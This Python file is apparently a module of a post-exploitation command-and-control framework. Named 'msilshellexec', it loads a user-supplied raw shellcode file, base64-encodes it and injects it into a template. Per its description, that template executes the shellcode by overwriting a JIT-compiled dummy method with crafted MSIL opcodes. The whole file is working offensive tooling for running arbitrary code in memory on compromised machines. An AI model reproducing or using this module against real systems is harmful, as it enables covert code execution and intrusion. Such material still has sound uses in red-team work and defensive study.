import os
from base64 import b64encode


class STModule:
    def __init__(self):
        self.name = 'msilshellexec'
        self.description = 'Executes shellcode by using specially crafted MSIL opcodes to overwrite a JITed dummy method.\nC# code that injects shellcode is dynamically compiled through the pyDLR'
        self.author = '@byt3bl33d3r'
        self.options = {
            'Shellcode': {
                'Description'   :   'Path to raw shellcode.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

    def payload(self):
        with open('modules/src/msilshellexec.py') as module:
            module = module.read()
            shellcode_path = os.path.expanduser(self.options['Shellcode']['Value'])
            if not os.path.exists(shellcode_path):
                raise Exception("Assembly not found in specified path")

            with open(shellcode_path, 'rb') as shellcode:
                module = module.replace('B64_SHELLCODE', b64encode(shellcode.read()).decode())
                return module.encode()
